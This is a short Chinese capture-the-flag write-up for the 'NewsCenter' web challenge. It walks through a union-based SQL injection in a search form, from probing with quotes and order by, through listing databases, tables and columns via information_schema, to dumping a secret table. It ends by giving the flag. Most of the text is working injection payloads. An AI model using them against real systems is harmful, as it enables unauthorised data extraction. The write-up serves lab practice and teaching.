**题名：**NewsCenter
**地址：**攻防世界web高手进阶区第六题

# 解法
这题有一个搜索框。搜索框经过了post表单，得到了php的处理。
表单名为search。
然后会显示内容。
这应该是一个sql注入题。
输入 wo'报错，是字符型注入。
输入wo' or 1 -- 显示所有文章。
再简化为 ' or 1 --
测试到' order by 3 --，字段数为3。
## ' union select 1,2,database() --  
得到当前database是news
##  ' union select 1,233,schema_name from information_schema.schemata -- 
只有两个数据库。 
##  ' union select 1,233,table_name from information_schema.tables where table_schema = database() -- 或 ' union select 1,233,table_name from information_schema.tables where table_schema = "news"; -- 
得知了一个secret_table的表
##  ' union select 1,233,column_name from information_schema.columns where table_name = "secret_table" -- 
然后有一个fl4g字段。
##   ' union select 1,id,fl4g from news.secret_table -- 
得到flag！QCTF{sq1_inJec7ion_ezzz}。

本题属于几乎没有过滤的SQL注入题。